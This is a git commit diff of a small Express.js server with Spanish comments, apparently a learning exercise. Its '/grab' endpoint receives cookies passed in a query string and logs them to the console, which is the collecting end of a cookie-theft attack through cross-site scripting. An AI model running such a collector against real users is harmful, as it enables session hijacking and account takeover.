2975adc67dfc39471bb1c982bc936c6901240e85
17alma41 <17alma41@gmail.com>
2024-11-06 23:38:24 +0100

    update

--- index.js
+++ index.js
@@ -6,29 +6,29 @@ let txt = ""
 
 app.get('/', (req, res)=>{
     res.send("Hola Mundo");
-    res.send(document.cookie)
 });
 
 app.get('/grab', (req, res) => {
     
     //Guardamos la data que el usuario nos manda en una variable global
-    const data = req.query.data
+    //const data = req.query.data
+    //txt += escapeHtml(data) + ""
+    //res.send(escapeHtml(data));
     
     //Recibir las cookies que  nos manda el usuario
     const cookies = req.query.cookies
-
-    //txt += escapeHtml(data) + ""
-    //res.send(escapeHtml(data));
-
+    console.log("Cookies recibidas:", cookies);
     //Mostramos las cookies
-    res.send(escapeHtml(cookies));
+    res.send(escapeHtml(cookies)); //No se puede mostrar en pantalla solo se ve en consola
+    
+    
 })
 
 app.get('/read', (req, res) =>{
     //Leemos el valor que nos envian a txt
-    res.send(escapeHtml(txt))
+    //res.send(escapeHtml(txt))
 })
 
 app.listen(3000, () => {
-    console.log(`Escuchando en el puerto 3000`)
+    console.log(`Escuchando en el puerto http://localhost:${3000}`)
 })
